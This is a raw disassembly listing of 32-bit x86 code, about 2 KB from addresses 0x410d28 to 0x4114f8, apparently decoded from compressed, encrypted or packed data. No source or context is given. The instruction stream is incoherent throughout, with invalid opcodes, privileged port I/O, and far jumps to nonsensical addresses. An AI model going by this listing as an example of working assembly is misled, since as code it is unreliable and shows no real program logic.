  410d28:	jg     0x410d95
  410d2a:	outs   dx,BYTE PTR ds:[esi]
  410d2b:	aas    
  410d2c:	pop    ecx
  410d2d:	dec    esi
  410d2e:	xor    bl,BYTE PTR ds:0x454f1c10
  410d34:	ret    0xe3a3
  410d37:	sub    eax,0xee5eefa6
  410d3c:	lock (bad) 
  410d3e:	in     al,dx
  410d3f:	fstp   DWORD PTR [edi]
  410d41:	(bad)  
  410d42:	and    eax,0x2c48ce16
  410d47:	mov    esi,0x9ee7393
  410d4c:	xchg   edx,eax
  410d4d:	dec    ebp
  410d4e:	pop    esi
  410d4f:	fldcw  WORD PTR [ebp+0x42]
  410d52:	in     al,0x4d
  410d54:	inc    eax
  410d55:	dec    ebp
  410d56:	jmp    0x410d11
  410d58:	les    edi,FWORD PTR [ebx-0x892a705]
  410d5e:	sub    DWORD PTR [ebx+0x4],ebx
  410d61:	iret   
  410d62:	xchg   dl,bl
  410d64:	push   cs
  410d65:	mov    ah,0x90
  410d67:	outs   dx,DWORD PTR ds:[esi]
  410d68:	push   edi
  410d69:	ss stos DWORD PTR es:[edi],eax
  410d6b:	jmp    0x4f1f1201
  410d70:	mov    al,ds:0xf66957c8
  410d75:	add    eax,0x94be1368
  410d7a:	mov    ds:0x10452afa,al
  410d7f:	pop    ebp
  410d80:	test   eax,0x4e3a2056
  410d85:	sbb    BYTE PTR [ecx+0x4],ah
  410d88:	in     eax,0x2a
  410d8a:	dec    edx
  410d8b:	mov    esp,DWORD PTR [edi]
  410d8d:	rcpps  xmm1,xmm0
  410d90:	stc    
  410d91:	sub    BYTE PTR [edx+0x23],bh
  410d94:	mov    bh,BYTE PTR [edi+0x3b2868b2]
  410d9a:	cli    
  410d9b:	sbb    BYTE PTR [eax+edi*2],cl
  410d9e:	mov    DWORD PTR [ebp+0x6ba096b4],ebx
  410da4:	fcmovu st,st(7)
  410da6:	push   0x285c527f
  410dab:	retf   
  410dac:	fcom   QWORD PTR ds:0xa6f681f0
  410db2:	pop    esi
  410db3:	pop    ebp
  410db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410db5:	adc    DWORD PTR ds:0x17090739,0x6a6299d5
  410dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dc0:	adc    BYTE PTR [esi+0x2458ca1b],bl
  410dc6:	fst    DWORD PTR [ecx+eiz*1]
  410dc9:	add    DWORD PTR [ebx+0x5d],eax
  410dcc:	idiv   BYTE PTR gs:[ebx+0x7e00ceab]
  410dd3:	cmp    al,0xa6
  410dd5:	ret    0x3541
  410dd8:	sbb    BYTE PTR [eax+ecx*8+0x9e1d6e0],bl
  410ddf:	adc    eax,0x2e40bed5
  410de4:	push   edi
  410de5:	xchg   ebx,eax
  410de6:	push   ss
  410de7:	jno    0x410dbf
  410de9:	stos   DWORD PTR es:[edi],eax
  410dea:	or     BYTE PTR [ebx-0xb],bl
  410ded:	pop    esp
  410dee:	data16 or dh,BYTE PTR [edx-0x6500cb91]
  410df5:	pop    ecx
  410df6:	sahf   
  410df7:	(bad)  
  410df8:	test   al,0xcc
  410dfa:	out    0xef,al
  410dfc:	arpl   WORD PTR [eax+edx*1],di
  410dff:	adc    ah,bh
  410e01:	fldenv [edi+ecx*2-0x64]
  410e05:	xor    al,0x8d
  410e07:	sub    BYTE PTR [edx-0x5dbd800b],dh
  410e0d:	fstp   TBYTE PTR [edi]
  410e0f:	xor    ch,BYTE PTR [ecx+0x3d9cb555]
  410e15:	rcl    DWORD PTR [eax+eax*1],0x57
  410e19:	xchg   esp,eax
  410e1a:	icebp  
  410e1b:	dec    edi
  410e1c:	or     eax,0xf9cefe66
  410e21:	ja     0x410de2
  410e23:	hlt    
  410e24:	pop    ds
  410e25:	dec    ebp
  410e26:	ja     0x410e03
  410e28:	int3   
  410e29:	push   ebx
  410e2a:	sub    ch,BYTE PTR [ecx+0x7f]
  410e2d:	int3   
  410e2e:	hlt    
  410e2f:	and    bl,bl
  410e31:	mov    ebp,DWORD PTR [edi+0x4c033d37]
  410e37:	aad    0x6f
  410e39:	add    BYTE PTR [esi-0x15],ch
  410e3c:	push   edi
  410e3d:	add    ah,ah
  410e3f:	aad    0xc
  410e41:	push   eax
  410e42:	imul   ebx,DWORD PTR [edi],0x7e5fe6f6
  410e48:	(bad)  
  410e49:	jge    0x410e1a
  410e4b:	into   
  410e4c:	out    dx,eax
  410e4d:	(bad)  
  410e4e:	ret    
  410e4f:	mov    ds:0x8427be8d,eax
  410e54:	dec    eax
  410e55:	dec    ebp
  410e56:	pop    edi
  410e57:	aas    
  410e58:	in     al,dx
  410e59:	int3   
  410e5a:	mov    ebx,0x35295b3b
  410e5f:	lock cmp edi,ebx
  410e62:	adc    eax,DWORD PTR [ebp+0x7b233741]
  410e68:	loope  0x410e03
  410e6a:	xor    cl,BYTE PTR [ebx]
  410e6c:	jge    0x410ecd
  410e6e:	fdivp  st(3),st
  410e70:	nop
  410e71:	mov    ebp,DWORD PTR [ebx-0x7717e48c]
  410e77:	jecxz  0x410ed9
  410e79:	mov    edi,0x5491c11a
  410e7e:	dec    DWORD PTR [edx]
  410e80:	sub    eax,0x4246352f
  410e85:	mov    ch,0x9d
  410e87:	xor    al,0x5c
  410e89:	mov    ch,dl
  410e8b:	dec    edx
  410e8c:	outs   dx,DWORD PTR ds:[esi]
  410e8d:	push   ecx
  410e8e:	add    DWORD PTR [eax-0x32],0xffffffe1
  410e92:	jmp    0xe0fd53be
  410e97:	aam    0x93
  410e99:	mov    dh,0xc1
  410e9b:	aam    0x81
  410e9d:	cmp    esi,ebp
  410e9f:	ins    DWORD PTR es:[edi],dx
  410ea0:	int    0x3d
  410ea2:	push   ds
  410ea3:	jo     0x410e47
  410ea5:	add    bh,ch
  410ea7:	mov    ds:0xfa8af299,al
  410eac:	cmp    DWORD PTR [ebx+0x36716afc],esi
  410eb2:	lds    ebx,FWORD PTR [ebp-0x3cdf84e5]
  410eb8:	pop    ds
  410eb9:	call   0x5907e00b
  410ebe:	xchg   ebx,eax
  410ebf:	repz cwde 
  410ec1:	mov    eax,0x49f383f8
  410ec6:	mov    al,0xb9
  410ec8:	jbe    0x410e9d
  410eca:	pop    es
  410ecb:	out    0x55,eax
  410ecd:	or     BYTE PTR gs:[ebp+0x60],0x19
  410ed2:	ds (bad) 
  410ed4:	and    ah,BYTE PTR [esi-0x7191d80e]
  410eda:	jmp    0x311f:0xab57cbd1
  410ee1:	push   cs
  410ee2:	mov    al,ds:0x1325b1ac
  410ee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee8:	inc    ebp
  410ee9:	loop   0x410e94
  410eeb:	jmp    0x410f2d
  410eed:	jne    0x410ed3
  410eef:	inc    eax
  410ef0:	adc    DWORD PTR [ebx+0x638679ab],ebx
  410ef6:	lods   eax,DWORD PTR ds:[esi]
  410ef7:	lods   al,BYTE PTR ds:[esi]
  410ef8:	adc    dh,ah
  410efa:	shr    esp,0x73
  410efd:	mov    cl,0x69
  410eff:	iret   
  410f00:	pop    ebp
  410f01:	sti    
  410f02:	cdq    
  410f03:	xor    al,0x67
  410f05:	or     DWORD PTR [edx],ecx
  410f07:	and    ecx,DWORD PTR [edx]
  410f09:	jae    0x410f12
  410f0b:	adc    DWORD PTR [edi-0x9ccf38d],eax
  410f11:	push   ecx
  410f12:	jo     0x410ef7
  410f14:	ins    BYTE PTR es:[edi],dx
  410f15:	sbb    ah,BYTE PTR [esi]
  410f17:	inc    eax
  410f18:	out    dx,eax
  410f19:	out    0xc6,al
  410f1b:	sub    edx,ebx
  410f1d:	mov    dl,0x52
  410f1f:	push   cs
  410f20:	sti    
  410f21:	or     DWORD PTR [ecx-0x26],edx
  410f24:	cmp    bh,dh
  410f26:	fild   QWORD PTR [edx+0x57]
  410f29:	fist   WORD PTR [edi]
  410f2b:	push   es
  410f2c:	pop    edi
  410f2d:	gs cld 
  410f2f:	(bad)  
  410f30:	stc    
  410f31:	jmp    FWORD PTR [edi+0xa]
  410f34:	aam    0x83
  410f36:	call   DWORD PTR [esi]
  410f38:	mov    esp,0xf6256365
  410f3d:	mov    al,ds:0x695e97d5
  410f42:	out    0x1d,eax
  410f44:	sbb    DWORD PTR [ebx],edi
  410f46:	in     al,0xad
  410f48:	(bad)  
  410f49:	mov    edi,0x35a281c8
  410f4e:	push   ds
  410f4f:	xchg   edx,eax
  410f50:	xchg   DWORD PTR [edi-0x1c],esp
  410f53:	cwde   
  410f54:	cli    
  410f55:	push   ds
  410f56:	rcl    BYTE PTR [ebx-0x26],0x46
  410f5a:	int3   
  410f5b:	jmp    FWORD PTR cs:[ecx-0x31]
  410f5f:	sahf   
  410f60:	inc    eax
  410f61:	mov    ah,0x0
  410f63:	xchg   edi,eax
  410f64:	lods   al,BYTE PTR ds:[esi]
  410f65:	xchg   ebx,eax
  410f66:	or     DWORD PTR [eax+0x57],edi
  410f69:	inc    ecx
  410f6a:	xchg   esp,eax
  410f6b:	push   esi
  410f6c:	sub    bl,BYTE PTR [edx]
  410f6e:	jae    0x410f8d
  410f70:	dec    ecx
  410f71:	out    dx,eax
  410f72:	add    dl,ch
  410f74:	jl     0x410fad
  410f76:	sbb    BYTE PTR [eax-0x5fc45df3],ah
  410f7c:	adc    BYTE PTR [esi+0x6bfbc0c8],0xca
  410f83:	out    dx,al
  410f84:	push   edi
  410f85:	xchg   al,dh
  410f87:	adc    bl,BYTE PTR [edi-0x14]
  410f8a:	jl     0x410fb1
  410f8c:	shl    bh,0xda
  410f8f:	inc    eax
  410f90:	je     0x410fc3
  410f92:	retf   
  410f93:	mov    esi,0x2a4074d0
  410f98:	push   cs
  410f99:	mov    edi,DWORD PTR [esi]
  410f9b:	sub    ch,BYTE PTR [ebp+0x1f]
  410f9e:	ror    bh,cl
  410fa0:	stos   BYTE PTR es:[edi],al
  410fa1:	push   esi
  410fa2:	popf   
  410fa3:	mov    cl,0x42
  410fa5:	or     BYTE PTR [edi],al
  410fa7:	data16 add BYTE PTR [edx-0xc],0x43
  410fac:	push   edi
  410fad:	sbb    edx,ebp
  410faf:	xchg   edi,eax
  410fb0:	int    0x6f
  410fb2:	dec    ebx
  410fb3:	add    al,0xa4
  410fb5:	dec    esi
  410fb6:	test   BYTE PTR [edi+0x55a1021f],bh
  410fbc:	mov    eax,ds:0x6d10063c
  410fc1:	leave  
  410fc2:	xlat   BYTE PTR ds:[ebx]
  410fc3:	push   0xde4b623c
  410fc8:	sub    al,0x9f
  410fca:	les    esi,FWORD PTR [esp+eax*2-0x5d]
  410fce:	sbb    ah,BYTE PTR [ecx]
  410fd0:	sub    BYTE PTR [esi+edi*1+0x4],bh
  410fd4:	jp     0x410f83
  410fd6:	dec    ebx
  410fd7:	loop   0x410fd1
  410fd9:	std    
  410fda:	xor    dh,BYTE PTR [edi]
  410fdc:	cs add eax,0xf09c3187
  410fe2:	repnz sbb ebp,DWORD PTR [ecx]
  410fe5:	fcomp  QWORD PTR [esi-0x80]
  410fe8:	test   al,0x33
  410fea:	jo     0x410f78
  410fec:	test   DWORD PTR [edi+0x29],esp
  410fef:	stos   DWORD PTR es:[edi],eax
  410ff0:	or     eax,0x420fe5f9
  410ff5:	inc    ebp
  410ff6:	push   ebx
  410ff7:	or     DWORD PTR [edx+0x309dee99],ebp
  410ffd:	inc    ebp
  410ffe:	je     0x410fe4
  411000:	inc    esi
  411001:	iret   
  411002:	mov    edx,0x5ffa3b1b
  411007:	inc    BYTE PTR [ebp-0x29]
  41100a:	mov    ebx,0xb4cade44
  41100f:	jmp    0x9cdd:0x1f814827
  411016:	inc    ebp
  411017:	in     eax,dx
  411018:	fmul   QWORD PTR [eax+edi*8]
  41101b:	sbb    DWORD PTR [ecx-0x65c10151],eax
  411021:	and    BYTE PTR [edx-0x6c6a4866],ch
  411027:	ins    DWORD PTR es:[edi],dx
  411028:	dec    eax
  411029:	jns    0x411094
  41102b:	jne    0x410ffe
  41102d:	(bad)  
  41102e:	jb     0x410fc5
  411030:	push   0x3761ec43
  411035:	jb     0x411054
  411037:	pop    ecx
  411038:	push   cs
  411039:	ss fscale 
  41103c:	sub    edi,DWORD PTR [edi]
  41103e:	shr    ebp,1
  411040:	jg     0x411023
  411042:	adc    al,0xda
  411044:	sub    DWORD PTR [eax-0x2d86224],0x77
  41104b:	inc    ecx
  41104c:	xchg   edx,eax
  41104d:	aad    0x56
  41104f:	je     0x411049
  411051:	gs div ebx
  411054:	leave  
  411055:	repz mov ?,WORD PTR [eax]
  411058:	nop
  411059:	push   esi
  41105a:	stc    
  41105b:	sub    BYTE PTR ds:0xcb47b247,dl
  411061:	sbb    eax,DWORD PTR [ecx-0x270379eb]
  411067:	imul   DWORD PTR [ecx+0x7f]
  41106a:	in     eax,0xcf
  41106c:	pop    eax
  41106d:	outs   dx,BYTE PTR ds:[esi]
  41106e:	xchg   ebx,eax
  41106f:	push   ebp
  411070:	cmp    BYTE PTR [edx],dh
  411072:	xor    BYTE PTR [ebx-0x41],al
  411075:	call   0x2f9d8784
  41107a:	push   0xfbf47caa
  41107f:	call   0xaa60:0xac099613
  411086:	jg     0x411013
  411088:	fld    DWORD PTR [ebx+0x619bb8d6]
  41108e:	cs repz mov esi,0x15da61e1
  411095:	jb     0x41107c
  411097:	mov    cl,0x3c
  411099:	jb     0x41106b
  41109b:	iret   
  41109c:	jnp    0x411081
  41109e:	and    dl,0xa9
  4110a1:	mov    esi,0xd3cc710e
  4110a6:	(bad)  
  4110a7:	call   0x15e8264
  4110ac:	and    ebx,edx
  4110ae:	cmp    DWORD PTR [ecx+0x21],eax
  4110b1:	lods   al,BYTE PTR ds:[esi]
  4110b2:	mov    edx,0x8cad9883
  4110b7:	adc    ah,al
  4110b9:	cdq    
  4110ba:	(bad)  [ebp-0x3bacddc3]
  4110c0:	dec    ebp
  4110c1:	pop    edi
  4110c2:	scas   eax,DWORD PTR es:[edi]
  4110c3:	push   ebx
  4110c4:	xchg   ebp,eax
  4110c5:	shr    DWORD PTR [edx+eax*2-0x5d],0xa0
  4110ca:	scas   al,BYTE PTR es:[edi]
  4110cb:	pop    edi
  4110cc:	scas   eax,DWORD PTR es:[edi]
  4110cd:	or     DWORD PTR [edi],esi
  4110cf:	pop    ss
  4110d0:	shr    BYTE PTR [esi+esi*2+0x40ce8d8],0x9d
  4110d8:	dec    edx
  4110d9:	push   0x25110708
  4110de:	enter  0x9e2b,0x4c
  4110e2:	fdivr  DWORD PTR [ebp+0xa]
  4110e5:	jl     0x4110ae
  4110e7:	outs   dx,BYTE PTR ds:[esi]
  4110e9:	retf   
  4110ea:	neg    DWORD PTR [ebp+0x77]
  4110ed:	and    dl,bl
  4110ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110f0:	pop    esp
  4110f1:	xchg   esp,eax
  4110f2:	jle    0x4110a0
  4110f4:	mov    bl,0xb4
  4110f6:	or     al,0xf2
  4110f8:	push   0x6f
  4110fa:	xchg   ebp,eax
  4110fb:	mov    esp,0xd1a435ed
  411100:	ds pushf 
  411102:	call   0x1e2e:0x5c2d1bfb
  411109:	pop    ds
  41110a:	cmp    bl,BYTE PTR [edi-0x28e1308]
  411110:	xor    al,0xc1
  411112:	cmp    edx,edx
  411114:	add    al,0x1
  411116:	das    
  411117:	mov    es,WORD PTR [ebp+0x6b]
  41111a:	and    bl,BYTE PTR [ebx]
  41111c:	in     al,dx
  41111d:	cmp    dh,BYTE PTR [ebp+edx*1+0x35]
  411121:	and    edi,ebp
  411123:	sbb    BYTE PTR [ecx],0xc3
  411126:	cs sti 
  411128:	retw   
  41112a:	out    dx,eax
  41112b:	fs cs leave 
  41112e:	sbb    BYTE PTR [esi],al
  411130:	mov    esi,0x555f9117
  411135:	fcmovnbe st,st(0)
  411137:	mov    eax,ds:0x3c4842d1
  41113c:	in     al,0x7b
  41113e:	add    BYTE PTR [edi+0x3c547b75],bl
  411144:	jns    0x411174
  411146:	jae    0x4110f7
  411148:	inc    eax
  411149:	or     eax,0x8c28ffee
  41114e:	mov    edx,0xb9d95013
  411153:	push   ds
  411154:	add    esi,DWORD PTR [ecx-0x7fcb9990]
  41115a:	mov    dh,0xf7
  41115c:	mov    BYTE PTR [eax+0x5dfd1d6e],ah
  411162:	push   edi
  411163:	add    eax,0xebb5d228
  411168:	add    esi,edx
  41116a:	jg     0x411174
  41116c:	fstp   TBYTE PTR [edx-0x5bbf7741]
  411172:	or     eax,0x22641f67
  411177:	pop    es
  411178:	sbb    DWORD PTR [ebp+0x318f6f5],ebp
  41117e:	pop    esi
  41117f:	sub    eax,0xd3c320d1
  411184:	cmp    al,0xab
  411186:	dec    ecx
  411187:	jle    0x4111f3
  411189:	or     al,0xcc
  41118b:	push   esp
  41118c:	add    al,0x87
  41118e:	cli    
  41118f:	shl    DWORD PTR cs:[edx+0x41],1
  411193:	mov    eax,0x33138c1c
  411198:	pop    ebx
  411199:	adc    esi,0x63
  41119c:	ror    DWORD PTR [eax],0xdd
  41119f:	xor    DWORD PTR [esi+0x6ce40b2e],ebp
  4111a5:	dec    esp
  4111a6:	jno    0x411213
  4111a8:	jecxz  0x411158
  4111aa:	sub    al,0xe
  4111ac:	dec    edx
  4111ad:	loopne 0x4111d4
  4111af:	mov    ds:0x9ac71dde,eax
  4111b4:	ja     0x411171
  4111b6:	pop    edx
  4111b7:	out    0x5c,al
  4111b9:	retf   
  4111ba:	pop    ss
  4111bb:	xor    BYTE PTR [edx+eiz*4+0x19dba4ab],ch
  4111c2:	sub    al,0x5f
  4111c4:	push   cs
  4111c5:	test   al,0x8a
  4111c7:	shl    BYTE PTR [eax-0x13],0xa0
  4111cb:	out    0x27,eax
  4111cd:	mov    dh,dl
  4111cf:	hlt    
  4111d0:	retf   
  4111d1:	outs   dx,BYTE PTR ds:[esi]
  4111d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111d3:	adc    eax,0x3fc98499
  4111d8:	(bad)  
  4111d9:	cmp    bl,BYTE PTR [edi+0x474ec90d]
  4111df:	add    eax,0xd3f99ccd
  4111e4:	xor    ah,BYTE PTR [esi+0x2c]
  4111e7:	pushf  
  4111e8:	(bad)  
  4111e9:	fld    QWORD PTR ds:0xa42aaecb
  4111ef:	in     al,0xe2
  4111f1:	pop    ds
  4111f2:	mov    esp,0xe3dfcc47
  4111f7:	aad    0xd5
  4111f9:	lock call 0x998e:0xda5cce44
  411201:	loopne 0x41120d
  411203:	push   ds
  411204:	int3   
  411205:	mov    es,ecx
  411207:	cmp    ch,bh
  411209:	test   al,ch
  41120b:	mov    DWORD PTR [esi],ecx
  41120d:	in     eax,0xbb
  41120f:	sub    dh,BYTE PTR [eax+0x2b8b41dc]
  411215:	push   0xffffff99
  411217:	ror    BYTE PTR [eax-0x5e403cb4],0x8c
  41121e:	jns    0x411203
  411220:	mov    ah,0xa
  411222:	or     al,0xc8
  411224:	repnz in eax,0xab
  411227:	xchg   esi,eax
  411228:	adc    BYTE PTR [esi+0x44],cl
  41122b:	push   ecx
  41122c:	xor    DWORD PTR [edx],0xffffff80
  41122f:	adc    eax,0x8266bcbf
  411234:	cmp    al,0xe1
  411236:	sub    BYTE PTR [edi-0x2d],dl
  411239:	push   ecx
  41123a:	cli    
  41123b:	pop    ebx
  41123c:	xor    BYTE PTR [ebp-0x3ebf2d42],ch
  411242:	imul   ebx,edi,0xffffffad
  411245:	addr16 cmc 
  411247:	hlt    
  411248:	dec    ebx
  411249:	add    DWORD PTR [ebp+0x6b],esp
  41124c:	gs das 
  41124e:	jecxz  0x41120c
  411250:	adc    BYTE PTR [eax-0x184eda4c],0xfe
  411257:	rol    BYTE PTR [ebp-0x6],0x1b
  41125b:	pop    ds
  41125c:	jns    0x41121e
  41125e:	cli    
  41125f:	jmp    0xaa85c1d5
  411264:	pop    ecx
  411265:	add    ecx,DWORD PTR [ebp-0x135b4908]
  41126b:	fdiv   DWORD PTR [eax-0x164c52cd]
  411271:	nop
  411272:	out    0xb,al
  411274:	jo     0x4112cb
  411276:	out    0x2d,al
  411278:	je     0x411223
  41127a:	test   DWORD PTR [ecx+ecx*1-0x17],0x364af682
  411282:	inc    ecx
  411283:	xchg   esp,eax
  411284:	xor    al,0xc0
  411286:	xor    ebp,DWORD PTR [ebp-0x48]
  411289:	int3   
  41128a:	cmp    BYTE PTR [ecx-0x72],0x48
  41128e:	loopne 0x411260
  411290:	hlt    
  411291:	mov    ds:0x2b937ca9,al
  411296:	std    
  411297:	mov    ds:0xa913b81e,eax
  41129c:	fwait
  41129d:	daa    
  41129e:	aas    
  41129f:	jns    0x41128d
  4112a1:	push   eax
  4112a2:	ss mov gs,edx
  4112a5:	or     DWORD PTR [esi],eax
  4112a7:	stos   BYTE PTR es:[edi],al
  4112a8:	(bad)  
  4112a9:	xlat   BYTE PTR ds:[ebx]
  4112aa:	inc    edx
  4112ab:	and    esi,eax
  4112ad:	das    
  4112ae:	push   ds
  4112af:	ss or  edi,ebp
  4112b2:	fbld   TBYTE PTR [edi-0x5f898083]
  4112b8:	fidivr DWORD PTR [esi-0x12]
  4112bb:	and    ecx,DWORD PTR [esi-0x12c4585d]
  4112c1:	inc    ebx
  4112c2:	mov    WORD PTR [ebx],fs
  4112c4:	mov    ecx,0xf9a8e2a4
  4112c9:	add    eax,0x15e965eb
  4112ce:	jbe    0x4112f1
  4112d0:	jno    0x41134b
  4112d2:	test   DWORD PTR [esi],edi
  4112d4:	test   DWORD PTR [esi-0x28],edi
  4112d7:	cmp    dh,BYTE PTR [ecx-0x4c]
  4112da:	mov    edx,0xb81d7d4
  4112df:	and    DWORD PTR [edi+ebp*4+0x7e],0xffffffe2
  4112e4:	std    
  4112e5:	hlt    
  4112e6:	mov    ecx,0xb04a0ee5
  4112eb:	in     al,0xd7
  4112ed:	jecxz  0x4112ec
  4112ef:	lods   al,BYTE PTR ds:[esi]
  4112f0:	loopne 0x41127d
  4112f2:	xlat   BYTE PTR ds:[ebx]
  4112f3:	mov    edi,0x4aea2f18
  4112f8:	xchg   esi,eax
  4112f9:	inc    ebp
  4112fa:	shr    ah,cl
  4112fc:	and    DWORD PTR [eax],esp
  4112fe:	push   0xffffffa4
  411300:	int3   
  411301:	jmp    0x69f0a1cf
  411306:	inc    eax
  411307:	mov    edi,0x3b418b66
  41130c:	add    ebx,DWORD PTR [eax-0x61]
  41130f:	loopne 0x4112b9
  411311:	test   al,0xdb
  411313:	(bad)  
  411314:	cmp    eax,0x1c610788
  411319:	inc    edi
  41131a:	pop    eax
  41131b:	dec    eax
  41131c:	xchg   DWORD PTR fs:[ecx+0x1b],edx
  411320:	dec    edi
  411321:	into   
  411322:	in     al,dx
  411323:	out    0x2f,eax
  411325:	mov    ah,0xfa
  411327:	sub    BYTE PTR [eax+0x569b8bc3],dl
  41132d:	xchg   edx,eax
  41132e:	xor    eax,0xc00d8583
  411333:	mov    DWORD PTR [ebx],eax
  411335:	pop    ecx
  411336:	(bad)  
  411337:	js     0x4112dc
  411339:	mov    al,0x71
  41133b:	mov    DWORD PTR [eax+0x66],ebp
  41133e:	mov    dl,0x18
  411340:	pop    ss
  411341:	ret    0xca7a
  411344:	outs   dx,BYTE PTR ds:[esi]
  411345:	inc    ebp
  411346:	cvttps2pi mm0,QWORD PTR [eax-0x6b3e1f1e]
  41134d:	fiadd  DWORD PTR [ebp-0x2bad4dd7]
  411353:	xor    edx,esp
  411355:	fisttp QWORD PTR [edx+0x4826a368]
  41135b:	mov    edx,0x45f306d8
  411360:	jg     0x41133b
  411362:	es das 
  411364:	push   es
  411365:	fcom   QWORD PTR [ecx+0x1262d842]
  41136b:	shr    BYTE PTR [eax+0x27],cl
  41136e:	inc    edx
  41136f:	daa    
  411370:	lods   al,BYTE PTR ds:[esi]
  411371:	jmp    0x41912ede
  411376:	cld    
  411377:	xchg   edx,eax
  411378:	fdivr  DWORD PTR [ecx+0x46ef562f]
  41137e:	(bad)  
  411380:	mov    ebx,ecx
  411382:	add    dh,ch
  411384:	sbb    eax,0xdfb089ab
  411389:	jle    0x41135b
  41138b:	xchg   edi,eax
  41138c:	aaa    
  41138d:	xchg   esi,eax
  41138e:	test   BYTE PTR [ecx],dh
  411390:	dec    esp
  411391:	sub    DWORD PTR [edx+0x1c28d5f4],esi
  411397:	xchg   ebp,eax
  411398:	inc    ebx
  411399:	mov    dl,0x8a
  41139b:	mov    dh,0x81
  41139d:	mov    esp,ebp
  41139f:	dec    edi
  4113a0:	cwde   
  4113a1:	mov    esi,0x1d898fc2
  4113a6:	or     edx,DWORD PTR [ecx]
  4113a8:	lock clc 
  4113aa:	mov    ebp,0xbd9dcba1
  4113af:	mov    al,0xd5
  4113b1:	mov    ah,0x4f
  4113b3:	sar    edi,cl
  4113b5:	mov    cl,0x0
  4113b7:	sub    BYTE PTR [ecx],bl
  4113b9:	jg     0x4113b3
  4113bb:	and    DWORD PTR [eax],esi
  4113bd:	in     eax,dx
  4113be:	xor    al,0xc9
  4113c0:	retf   
  4113c1:	enter  0xeeb3,0x55
  4113c5:	and    BYTE PTR [eax],0x3b
  4113c8:	push   ebp
  4113c9:	addr16 (bad) 
  4113cc:	dec    esp
  4113cd:	popa   
  4113ce:	loop   0x4113b5
  4113d0:	(bad)  
  4113d1:	push   ebp
  4113d2:	pusha  
  4113d3:	jmp    0x4113e6
  4113d5:	test   al,0x9
  4113d7:	mov    edx,0x9a1527f6
  4113dc:	clc    
  4113dd:	or     bl,BYTE PTR [ebp+0x31cd98fe]
  4113e3:	sar    BYTE PTR [ebx-0x56],1
  4113e6:	and    DWORD PTR [edx+0x24d9fdfa],ebx
  4113ec:	imul   esi,DWORD PTR [edx+ebp*2],0x3e3ad4d0
  4113f3:	lods   eax,DWORD PTR ds:[esi]
  4113f4:	xor    al,0xd9
  4113f6:	lds    edx,FWORD PTR [edx+0x5e]
  4113f9:	call   0x68b08504
  4113fe:	push   eax
  4113ff:	addr16 jmp 0x6248:0x913257b9
  411407:	imul   edi,DWORD PTR [esi+edx*8],0x32
  41140b:	scas   eax,DWORD PTR es:[edi]
  41140c:	jns    0x411449
  41140e:	push   edi
  41140f:	ds pop eax
  411411:	ins    DWORD PTR es:[edi],dx
  411412:	mov    dl,0x62
  411414:	movlps xmm3,QWORD PTR [esi]
  411417:	outs   dx,DWORD PTR ds:[esi]
  411418:	ret    
  411419:	lods   al,BYTE PTR ds:[esi]
  41141a:	iret   
  41141b:	int3   
  41141c:	add    al,0xc5
  41141e:	push   0xae43d039
  411423:	scas   eax,DWORD PTR es:[edi]
  411424:	outs   dx,BYTE PTR ds:[esi]
  411425:	and    BYTE PTR [ecx],al
  411427:	push   cs
  411428:	jge    0x4113e1
  41142a:	shr    BYTE PTR [edx-0x147ab793],0x56
  411431:	jp     0x4113bc
  411433:	pop    esi
  411434:	jmp    0x4113fc
  411436:	pushf  
  411437:	cli    
  411438:	icebp  
  411439:	push   esi
  41143a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143b:	mov    ecx,0x33469147
  411440:	inc    ecx
  411441:	lods   eax,DWORD PTR ds:[esi]
  411442:	cli    
  411443:	push   0x415cbd9b
  411448:	mov    ebx,ecx
  41144a:	push   edi
  41144b:	pop    edi
  41144c:	iret   
  41144d:	dec    edx
  41144e:	push   0x1d40d4d7
  411453:	adc    edi,DWORD PTR [edi]
  411455:	jbe    0x411488
  411457:	inc    esp
  411458:	jmp    0xd608e255
  41145d:	sub    edx,ebp
  41145f:	scas   eax,DWORD PTR es:[edi]
  411460:	push   esp
  411461:	push   0x94638563
  411466:	xchg   ah,dh
  411468:	mov    eax,0xe5f2ef75
  41146d:	loopne 0x4114d7
  41146f:	loope  0x41148b
  411471:	pop    edi
  411472:	popa   
  411473:	xchg   ecx,eax
  411474:	mov    ebp,0xc140b0e0
  411479:	push   edi
  41147a:	adc    eax,DWORD PTR [eax]
  41147c:	sub    bl,bh
  41147e:	loopne 0x4114b8
  411480:	inc    edx
  411481:	imul   ebp,DWORD PTR [edx],0xfffffff0
  411484:	jg     0x411500
  411486:	mov    ds:0x3ac1bf25,al
  41148b:	xor    eax,DWORD PTR [edx+edx*2]
  41148e:	std    
  41148f:	inc    ebx
  411490:	push   ecx
  411491:	dec    edi
  411492:	pop    eax
  411493:	js     0x41146d
  411495:	ins    DWORD PTR es:[edi],dx
  411496:	arpl   WORD PTR [ecx-0x6db56c89],bp
  41149c:	stos   BYTE PTR es:[edi],al
  41149d:	add    dh,BYTE PTR [ebx+0x47]
  4114a0:	aas    
  4114a1:	or     DWORD PTR [ebx],edx
  4114a3:	pop    ds
  4114a4:	mov    ebp,0xc2320d55
  4114a9:	adc    BYTE PTR [eax-0x318dda5b],al
  4114af:	and    al,BYTE PTR [ecx-0x80]
  4114b2:	pop    bp
  4114b4:	mov    esp,0xacb59b27
  4114b9:	push   edi
  4114ba:	mov    al,ds:0x712c7ace
  4114bf:	or     eax,0x3b212fda
  4114c4:	xchg   ecx,eax
  4114c5:	cmc    
  4114c6:	adc    ch,BYTE PTR [ecx+0x7bb1f53]
  4114cc:	dec    eax
  4114cd:	ror    BYTE PTR [eax-0x7d1735d],0xd0
  4114d4:	fucomip st,st(0)
  4114d6:	inc    edx
  4114d7:	jecxz  0x4114b8
  4114d9:	fs and edx,ebx
  4114dc:	ins    DWORD PTR es:[edi],dx
  4114dd:	lock cmp edi,DWORD PTR [ecx+0x54]
  4114e1:	fwait
  4114e2:	or     al,0x6c
  4114e4:	pop    eax
  4114e5:	add    eax,0xb60fb859
  4114ea:	lods   al,BYTE PTR ds:[esi]
  4114eb:	imul   edi,DWORD PTR [edx+0x46acb0b],0x70f8f2bd
  4114f5:	pop    edi
  4114f6:	out    0x9c,eax
  4114f8:	div    DWORD PTR [ebp+0x64]
